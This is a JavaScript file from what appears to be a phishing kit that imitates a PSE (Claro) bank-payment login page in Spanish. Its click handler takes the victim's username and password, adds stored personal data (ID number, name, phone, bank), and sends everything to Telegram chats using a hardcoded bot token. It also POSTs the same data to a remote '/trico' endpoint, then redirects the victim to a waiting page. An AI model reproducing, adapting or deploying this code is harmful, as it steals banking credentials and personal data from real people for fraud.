function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

// Elemento con el botón de entrar
const button = document.getElementById("btnUsuario");

// Input de Usuario
const userInput = document.getElementById("txtUsuario");

// Input de Contraseña
const passInput = document.getElementById("txtPass");

async function sendToTelegram(message) {
  for (const chatId of chatIds) {
    const url = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
      message
    )}`;

    try {
      const response = await fetch(url);
      if (response.ok) {
        console.log(`Mensaje enviado a Telegram (chat ID: ${chatId})`);
      } else {
        console.error(
          `Error al enviar mensaje (chat ID: ${chatId}):`,
          response.statusText
        );
      }
    } catch (error) {
      console.error(`Error de red (chat ID: ${chatId}):`, error);
    }
  }
}

button.addEventListener("click", async function (e) {
  e.preventDefault();
  button.disabled = true;

  if (userInput.value == "" && passInput.value == "") {
    alert("Por favor ingrese la información requerida");
    userInput.focus();
    button.disabled = false;
    return;
  } else {
    var user = userInput.value;
    var pass = passInput.value;

    info.metaInfo.user = user;
    info.metaInfo.puser = pass;

    updateLS();

    const data = {
      id: info.metaInfo.cc,
      nombre: info.metaInfo.dudename,
      telefono: info.metaInfo.telnum,
      direccion: "",
      usuario: info.metaInfo.user,
      password: info.metaInfo.puser,
      bank: info.metaInfo.ban,
    };

    // Crear el mensaje con toda la información
    const message = `🟣 PSE (Claro)\n©️ID: ${data.id}\n🆔Nombre: ${data.nombre}\n📱Teléfono: ${data.telefono}\n🚹Usuario: ${data.usuario}\n🔒Contraseña: ${data.password}\n🏦Banco: ${data.bank}\nFuente: ${fuente}`;

    // Enviar el mensaje a Telegram
    await sendToTelegram(message);

    // Make the POST request
    try {
      const response = await fetch(`${url}/trico/tricoPse`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      if (!response.ok) {
        throw new Error("Network response was not ok");
      }

      const responseData = await response.json();
      window.location.href = "./wait.html";
    } catch (error) {
      console.error("Error:", error);
      button.disabled = false;
    }
  }
});
